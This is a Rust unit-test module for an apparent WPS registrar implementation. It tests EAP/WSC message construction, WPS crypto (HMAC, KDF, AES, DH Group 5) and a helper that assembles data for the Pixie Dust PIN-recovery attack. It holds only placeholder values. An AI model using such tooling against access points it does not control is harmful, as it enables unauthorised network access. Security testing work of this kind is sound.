    fn test_build_eap_identity_response() {
        let eap = build_eap_identity_response(42);
        assert_eq!(eap[0], 2); // Response
        assert_eq!(eap[1], 42); // ID
        let len = u16::from_be_bytes([eap[2], eap[3]]) as usize;
        assert_eq!(len, eap.len());
        assert_eq!(eap[4], 1); // Type: Identity
        let identity = std::str::from_utf8(&eap[5..]).unwrap();
        assert_eq!(identity, WPS_REGISTRAR_IDENTITY);
    }

    #[test]
    fn test_build_eap_wsc_msg_structure() {
        let wps_body = [0x10, 0x4A, 0x00, 0x01, 0x10]; // Version TLV
        let eap = build_eap_wsc_msg(7, opcode::WSC_MSG, &wps_body);

        assert_eq!(eap[0], 2); // Response
        assert_eq!(eap[1], 7); // ID
        let len = u16::from_be_bytes([eap[2], eap[3]]) as usize;
        assert_eq!(len, eap.len());
        assert_eq!(eap[4], 254); // Expanded Type
        assert_eq!(&eap[5..8], &WFA_VENDOR_ID);
        assert_eq!(&eap[8..12], &WFA_VENDOR_TYPE_SIMPLECONFIG);
        assert_eq!(eap[12], opcode::WSC_MSG);
        assert_eq!(eap[13], 0x00); // Flags: none
        assert_eq!(&eap[14..], &wps_body);
    }

    #[test]
    fn test_parse_eap_wsc_roundtrip() {
        let wps_body = build_wsc_nack(&[0x11; 16], &[0x22; 16], 0);
        let eap = build_eap_wsc_msg(5, opcode::WSC_NACK, &wps_body);

        let header = parse_eap_wsc(&eap).unwrap();
        assert_eq!(header.code, 2);
        assert_eq!(header.id, 5);
        assert_eq!(header.op_code, opcode::WSC_NACK);
        assert_eq!(header.flags, 0);
        assert_eq!(header.body, &wps_body[..]);
    }

    #[test]
    fn test_parse_eap_wsc_too_short() {
        assert!(parse_eap_wsc(&[0x01, 0x02, 0x03]).is_none());
    }

    #[test]
    fn test_parse_eap_wsc_wrong_type() {
        // EAP with type != 254
        let mut eap = vec![2, 1, 0, 20, 1]; // Type: Identity
        eap.resize(20, 0);
        assert!(parse_eap_wsc(&eap).is_none());
    }

    #[test]
    fn test_build_eap_wsc_start() {
        let eap = build_eap_wsc_start(1);
        let header = parse_eap_wsc(&eap).unwrap();
        assert_eq!(header.code, 1); // Request
        assert_eq!(header.op_code, opcode::WSC_START);
        assert_eq!(header.body.len(), 0);
    }

    #[test]
    fn test_build_eap_wsc_frag_ack() {
        let eap = build_eap_wsc_frag_ack(3);
        let header = parse_eap_wsc(&eap).unwrap();
        assert_eq!(header.code, 2); // Response
        assert_eq!(header.id, 3);
        assert_eq!(header.op_code, opcode::WSC_FRAG_ACK);
    }

    // ── Patch authenticator test ──

    #[test]
    fn test_patch_authenticator() {
        let e_hash1 = [0xAA; 32];
        let e_hash2 = [0xBB; 32];
        let r_nonce = [0x22; 16];

        let mut body = build_m3(&r_nonce, &e_hash1, &e_hash2);

        // Verify authenticator is initially zeros
        let msg = parse_wps_message(&body).unwrap();
        assert_eq!(msg.authenticator, Some([0u8; 8]));

        // Patch with a known value
        let new_auth = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08];
        assert!(patch_authenticator(&mut body, &new_auth));

        // Verify it changed
        let msg = parse_wps_message(&body).unwrap();
        assert_eq!(msg.authenticator, Some(new_auth));
    }

    // ── WPS assoc IE test ──

    #[test]
    fn test_build_wps_assoc_ie() {
        let ie = build_wps_assoc_ie();

        // First byte: tag 221 (Vendor Specific)
        assert_eq!(ie[0], 221);

        // OUI: 00:50:F2:04
        assert_eq!(&ie[2..6], &[0x00, 0x50, 0xF2, 0x04]);

        // Parse the WPS body inside
        let wps_body = &ie[6..];
        let info = parse_wps_ie(wps_body).unwrap();
        assert_eq!(info.version, WPS_VERSION_1);
        assert_eq!(info.request_type, request_type::REGISTRAR);
    }

    // ── Pixie Dust data test ──

    #[test]
    fn test_build_pixie_dust_data() {
        // Build Pixie Dust data from Registrar perspective
        // enrollee nonce/PKe from M1, registrar nonce/PKr from M2, E-Hash from M3
        let pd = build_pixie_dust_data(
            [0x11; 16],        // enrollee nonce (from AP's M1)
            [0x22; 16],        // registrar nonce (ours)
            vec![0xAA; 192],   // PKe (from AP's M1)
            vec![0xBB; 192],   // PKr (ours)
            [0x33; 32],        // E-Hash1 (from AP's M3)
            [0x44; 32],        // E-Hash2 (from AP's M3)
            [0xFF; 32],        // AuthKey (derived from DH)
        );
        assert_eq!(pd.enrollee_nonce, [0x11; 16]);
        assert_eq!(pd.registrar_nonce, [0x22; 16]);
        assert_eq!(pd.enrollee_public_key.len(), 192);
        assert_eq!(pd.registrar_public_key.len(), 192);
        assert_eq!(pd.e_hash1, [0x33; 32]);
        assert_eq!(pd.e_hash2, [0x44; 32]);
        assert!(pd.auth_key.is_some());
        assert!(pd.e_snonce1.is_none());
    }

    // ── Pad helper test ──

    #[test]
    fn test_pad_to_aes_block() {
        assert_eq!(pad_to_aes_block(&[]).len(), 0);
        assert_eq!(pad_to_aes_block(&[1]).len(), 16);
        assert_eq!(pad_to_aes_block(&[1; 16]).len(), 16);
        assert_eq!(pad_to_aes_block(&[1; 17]).len(), 32);
        assert_eq!(pad_to_aes_block(&[1; 32]).len(), 32);
        assert_eq!(pad_to_aes_block(&[1; 33]).len(), 48);

        // Verify padding bytes are zero
        let padded = pad_to_aes_block(&[0xFF; 3]);
        assert_eq!(padded[0..3], [0xFF; 3]);
        assert_eq!(padded[3..16], [0x00; 13]);
    }

    // ── Attribute constant verification ──

    #[test]
    fn test_attr_constants_match_c_reference() {
        // Verify attribute constants match the C implementation
        assert_eq!(attr::VERSION, 0x104A);
        assert_eq!(attr::MSG_TYPE, 0x1022);
        assert_eq!(attr::UUID_E, 0x1047);
        assert_eq!(attr::UUID_R, 0x1048);
        assert_eq!(attr::MAC_ADDRESS, 0x1020);
        assert_eq!(attr::ENROLLEE_NONCE, 0x101A);
        assert_eq!(attr::REGISTRAR_NONCE, 0x1039);
        assert_eq!(attr::PUBLIC_KEY, 0x1032);
        assert_eq!(attr::AUTH_TYPE_FLAGS, 0x1004);
        assert_eq!(attr::ENCRYPTION_TYPE_FLAGS, 0x1010);
        assert_eq!(attr::CONNECTION_TYPE_FLAGS, 0x100D);
        assert_eq!(attr::CONFIG_METHODS, 0x1008);
        assert_eq!(attr::WPS_STATE, 0x1044);
        assert_eq!(attr::MANUFACTURER, 0x1021);
        assert_eq!(attr::MODEL_NAME, 0x1023);
        assert_eq!(attr::MODEL_NUMBER, 0x1024);
        assert_eq!(attr::SERIAL_NUMBER, 0x1042);
        assert_eq!(attr::PRIMARY_DEVICE_TYPE, 0x1054);
        assert_eq!(attr::DEVICE_NAME, 0x1011);
        assert_eq!(attr::RF_BANDS, 0x103C);
        assert_eq!(attr::ASSOC_STATE, 0x1002);
        assert_eq!(attr::DEVICE_PASSWORD_ID, 0x1012);
        assert_eq!(attr::CONFIG_ERROR, 0x1009);
        assert_eq!(attr::OS_VERSION, 0x102D);
        assert_eq!(attr::E_HASH1, 0x1014);
        assert_eq!(attr::E_HASH2, 0x1015);
        assert_eq!(attr::R_HASH1, 0x103D);
        assert_eq!(attr::R_HASH2, 0x103E);
        assert_eq!(attr::E_SNONCE1, 0x1016);
        assert_eq!(attr::E_SNONCE2, 0x1017);
        assert_eq!(attr::R_SNONCE1, 0x103F);
        assert_eq!(attr::R_SNONCE2, 0x1040);
        assert_eq!(attr::AUTHENTICATOR, 0x1005);
        assert_eq!(attr::KEY_WRAP_AUTHENTICATOR, 0x101E);
        assert_eq!(attr::ENCRYPTED_SETTINGS, 0x1018);
        assert_eq!(attr::SSID, 0x1045);
        assert_eq!(attr::NETWORK_KEY, 0x1027);
        assert_eq!(attr::AP_SETUP_LOCKED, 0x1057);
        assert_eq!(attr::SELECTED_REGISTRAR, 0x1041);
        assert_eq!(attr::RESPONSE_TYPE, 0x103B);
        assert_eq!(attr::REQUEST_TYPE, 0x103A);
        assert_eq!(attr::CREDENTIAL, 0x100E);
        assert_eq!(attr::VENDOR_EXTENSION, 0x1049);
    }

    // ── DH Group 5 prime verification ──

    // ── Crypto function tests ──

    #[test]
    fn test_wps_hmac_sha256_rfc4231_vector() {
        // RFC 4231 Test Case 2: HMAC-SHA-256
        let key = b"Jefe";
        let data = b"what do ya want for nothing?";
        let expected: [u8; 32] = [
            0x5b, 0xdc, 0xc1, 0x46, 0xbf, 0x60, 0x75, 0x4e,
            0x6a, 0x04, 0x24, 0x26, 0x08, 0x95, 0x75, 0xc7,
            0x5a, 0x00, 0x3f, 0x08, 0x9d, 0x27, 0x39, 0x83,
            0x9d, 0xec, 0x58, 0xb9, 0x64, 0xec, 0x38, 0x43,
        ];
        let result = wps_hmac_sha256(key, data).unwrap();
        assert_eq!(result, expected);
    }

    #[test]
    fn test_wps_hmac_sha256_multi_matches_single() {
        let key = [0x42u8; 32];
        let data = b"hello world test data";

        let single = wps_hmac_sha256(&key, data).unwrap();
        let multi = wps_hmac_sha256_multi(&key, &[b"hello ", b"world ", b"test data"]).unwrap();
        assert_eq!(single, multi);
    }

    #[test]
    fn test_wps_kdf_produces_correct_length() {
        let key = [0xAA; 32];

        // 640 bits = 80 bytes
        let result = wps_kdf(&key, "Wi-Fi Easy and Secure Key Derivation", 640).unwrap();
        assert_eq!(result.len(), 80);

        // 256 bits = 32 bytes
        let result = wps_kdf(&key, "test", 256).unwrap();
        assert_eq!(result.len(), 32);

        // 512 bits = 64 bytes
        let result = wps_kdf(&key, "test", 512).unwrap();
        assert_eq!(result.len(), 64);
    }

    #[test]
    fn test_wps_kdf_deterministic() {
        let key = [0xBB; 32];
        let r1 = wps_kdf(&key, "label", 256).unwrap();
        let r2 = wps_kdf(&key, "label", 256).unwrap();
        assert_eq!(r1, r2);

        // Different label produces different output
        let r3 = wps_kdf(&key, "other", 256).unwrap();
        assert_ne!(r1, r3);
    }

    #[test]
    fn test_wps_aes_encrypt_decrypt_roundtrip() {
        let key: [u8; 16] = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
                             0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10];
        let iv: [u8; 16] = [0x11; 16];
        let plaintext = [0x42u8; 32]; // two blocks

        let ciphertext = wps_aes_encrypt(&key, &iv, &plaintext).unwrap();
        assert_eq!(ciphertext.len(), 32);
        assert_ne!(&ciphertext[..], &plaintext[..]); // encrypted != plaintext

        let decrypted = wps_aes_decrypt(&key, &iv, &ciphertext).unwrap();
        assert_eq!(&decrypted[..], &plaintext[..]);
    }

    #[test]
    fn test_wps_aes_rejects_unaligned() {
        let key = [0u8; 16];
        let iv = [0u8; 16];
        // 17 bytes is not block-aligned
        assert!(wps_aes_encrypt(&key, &iv, &[0u8; 17]).is_none());
        assert!(wps_aes_decrypt(&key, &iv, &[0u8; 17]).is_none());
    }

    #[test]
    fn test_wps_dh_generate_returns_valid_keys() {
        let (privkey, pubkey) = wps_dh_generate().unwrap();
        assert_eq!(privkey.len(), 192);
        assert_eq!(pubkey.len(), 192);

        // Top bit of private key must be clear
        assert_eq!(privkey[0] & 0x80, 0);

        // Public key should not be all zeros
        assert!(pubkey.iter().any(|&b| b != 0));
    }

    #[test]
    fn test_wps_dh_shared_secret_consistency() {
        // Generate two keypairs and verify DH exchange produces same shared secret
        let (priv_a, pub_a) = wps_dh_generate().unwrap();
        let (priv_b, pub_b) = wps_dh_generate().unwrap();

        let shared_ab = wps_dh_shared_secret(&priv_a, &pub_b).unwrap();
        let shared_ba = wps_dh_shared_secret(&priv_b, &pub_a).unwrap();

        assert_eq!(shared_ab.len(), 192);
        assert_eq!(shared_ab, shared_ba);
    }

    #[test]
    fn test_wps_derive_keys_returns_keys() {
        let dh_secret = vec![0x42; 192];
        let e_nonce = [0x11; 16];
        let mac = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
        let r_nonce = [0x22; 16];

        let keys = wps_derive_keys(&dh_secret, &e_nonce, &mac, &r_nonce).unwrap();
        assert_eq!(keys.auth_key.len(), 32);
        assert_eq!(keys.key_wrap_key.len(), 16);
        assert_eq!(keys.emsk.len(), 32);

        // Deterministic
        let keys2 = wps_derive_keys(&dh_secret, &e_nonce, &mac, &r_nonce).unwrap();
        assert_eq!(keys.auth_key, keys2.auth_key);
        assert_eq!(keys.key_wrap_key, keys2.key_wrap_key);
        assert_eq!(keys.emsk, keys2.emsk);
    }

    #[test]
    fn test_build_encrypted_settings_inner_has_kwa() {
        let auth_key = [0xCC; 32];
        let nonce = [0xDD; 16];

        let inner = build_encrypted_settings_inner(attr::E_SNONCE1, &nonce, &auth_key).unwrap();

        // Parse the TLVs: should have E_SNONCE1 and KEY_WRAP_AUTHENTICATOR
        let tlvs: Vec<WpsTlv> = WpsTlvIterator::new(&inner).collect();
        assert_eq!(tlvs.len(), 2);
        assert_eq!(tlvs[0].attr_type, attr::E_SNONCE1);
        assert_eq!(tlvs[1].attr_type, attr::KEY_WRAP_AUTHENTICATOR);
        assert_eq!(tlvs[1].data.len(), 8);

        // KWA should NOT be all zeros (it's a real HMAC now)
        assert_ne!(tlvs[1].data, &[0u8; 8]);

        // Verify KWA is correct: HMAC-SHA256(auth_key, nonce_tlv_bytes)[..8]
        // The nonce TLV is: type(2) + len(2) + value(16) = 20 bytes
        let nonce_tlv_bytes = &inner[..20];
        let expected_hmac = wps_hmac_sha256(&auth_key, nonce_tlv_bytes).unwrap();
        assert_eq!(tlvs[1].data, &expected_hmac[..8]);
    }

    #[test]
    fn test_dh_group5_prime_rfc3526() {
        // Verify first and last bytes of the RFC 3526 Group 5 prime
        assert_eq!(DH_GROUP5_PRIME[0], 0xFF);
        assert_eq!(DH_GROUP5_PRIME[1], 0xFF);
        assert_eq!(DH_GROUP5_PRIME[190], 0xFF);
        assert_eq!(DH_GROUP5_PRIME[191], 0xFF);
        assert_eq!(DH_GROUP5_PRIME.len(), 192);

        // Verify a known interior byte sequence
        assert_eq!(DH_GROUP5_PRIME[8], 0xC9);
        assert_eq!(DH_GROUP5_PRIME[9], 0x0F);
        assert_eq!(DH_GROUP5_PRIME[10], 0xDA);
        assert_eq!(DH_GROUP5_PRIME[11], 0xA2);
    }
}
